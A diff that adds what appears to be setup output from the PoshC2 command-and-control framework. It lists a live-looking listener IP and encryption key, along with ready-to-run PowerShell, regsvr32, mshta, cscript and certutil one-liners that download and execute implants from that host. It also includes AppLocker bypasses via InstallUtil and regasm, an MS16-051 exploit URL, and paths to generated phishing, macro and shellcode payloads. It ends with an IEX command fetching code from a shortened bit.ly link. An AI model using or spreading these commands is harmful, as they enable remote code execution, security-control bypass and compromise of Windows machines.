@@ -1,0 +1,67 @@
+PoshC2 Unique Encryption Key: NmUVRL787nqaogy0nspOOLR0MVJjg2h6Frm2S5108ng=
+
+Apache rewrite rules written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\apache.conf
+
+Listening on: http://71.193.242.109 Port 8080 (HTTP) | Kill Date 02/02/2020
+
+To quickly get setup for internal pentesting, run:
+powershell -exec bypass -c "IEX (new-object system.net.webclient).downloadstring('http://71.193.242.109:8080/news/bjfyv')"
+
+For a more stealthy approach, use SubTee's hidden gems, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:
+regsvr32 /s /n /u /i:http://71.193.242.109:8080/news/bjfyv_rg scrobj.dll
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers "script:http://71.193.242.109:8080/news/bjfyv_cs"
+mshta.exe vbscript:GetObject("script:http://71.193.242.109:8080/news/bjfyv_cs")(window.close)
+
+Or use Forshaw's DotNetToJS to obtain execution, NOTE: This does not work with untrusted SSL certificates if using over HTTPS:
+mshta.exe vbscript:GetObject("script:http://71.193.242.109:8080/news/bjfyv_js")(window.close)
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers "script:http://71.193.242.109:8080/news/bjfyv_js"
+
+To Bypass AppLocker or equivalent, use InstallUtil.exe or Regasm:
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\posh.exe
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\posh.exe
+
+To exploit MS16-051 via IE9-11 use the following URL:
+http://71.193.242.109:8080/news/bjfyv_ms16-051
+
+To download PoshC2 InstallUtil/General executable use the following URL:
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers "script:http://71.193.242.109:8080/news/bjfyv_df"
+certutil -urlcache -split -f http://71.193.242.109:8080/news/bjfyv_iu %temp%\\bjfyv_iu
+
+For Red Teaming activities, use the following payloads:
+Batch Payload written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\Payload.bat
+StandAlone Exe written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\Posh.exe
+HTA Payload written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\index.html and Launcher.hta
+Macro Payload written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\macro.txt
+Wscript Payload written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\wscript.vbs
+MS16-051 payload, use this via a web server: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\ms16-051.html
+LNK Payload written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\PhishingAttack-Link.lnk
+Service Exe written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\PoshService.exe
+Cannot find any Java JDK versions Installed, Install Java JDK to create Java Applet Payloads
+
+ReflectiveDLL and Shellcode that loads CLR v2.0.50727 - DLL Export (VoidFunc2)
+x86 DLL Written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\Posh_v2_x86.dll
+x64 DLL Written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\Posh_v2_x64.dll
+x86 Shellcode Written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\Posh_v2-shellcode_x86.bin
+x64 Shellcode Written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\Posh_v2-shellcode_x64.bin
+
+ReflectiveDLL and Shellcode that loads CLR v4.0.30319 - DLL Export (VoidFunc)
+x86 DLL Written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\Posh_x86.dll
+x64 DLL Written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\Posh_x64.dll
+x86 Shellcode Written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\Posh-shellcode_x86.bin
+x64 Shellcode Written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\Posh-shellcode_x64.bin
+
+RunDLL Example:
+rundll32 Posh_x64.dll,VoidFunc
+
+DotNetToJS Created .js Payload written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\posh.js
+JS_SCT Payload written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\js_sct.xml
+RG_SCT Payload written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\rg_sct.xml
+CS_SCT Payload written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\cs_sct.xml
+DF_SCT Payload written to: C:\Users\flipb\Download\PoshC2-2018-19-04-1806\payloads\df_sct.xml
+
+To re-open the Implant-Handler or C2Server, use the following shortcuts in this directory:
+C:\Users\flipb\Download\PoshC2-2018-19-04-1806
+
+
+
+powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://bit.ly/2HDf58u');
